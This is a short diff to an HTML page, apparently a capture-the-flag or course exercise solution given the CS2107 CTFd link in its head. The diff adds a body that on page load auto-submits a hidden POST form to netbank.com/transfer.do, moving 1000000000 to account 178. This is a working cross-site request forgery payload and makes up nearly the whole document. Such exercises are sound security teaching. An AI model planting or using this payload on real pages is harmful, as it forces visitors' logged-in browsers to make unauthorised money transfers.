@@ -3,4 +3,13 @@
 <head>
     <a href="http://cs2107-ctfd-i.comp.nus.edu:5003/transfer/178">Read more!</a>
 </head>
+    
+<body onload="document.forms[0].submit()">
+   <form action="http://netbank.com/transfer.do" method="POST">
+     <input type="hidden" name="account" value="178"/>
+     <input type="hidden" name="amount" value="1000000000"/>
+     <input type="submit"/>
+   </form>
+ </body>
+    
 </html>
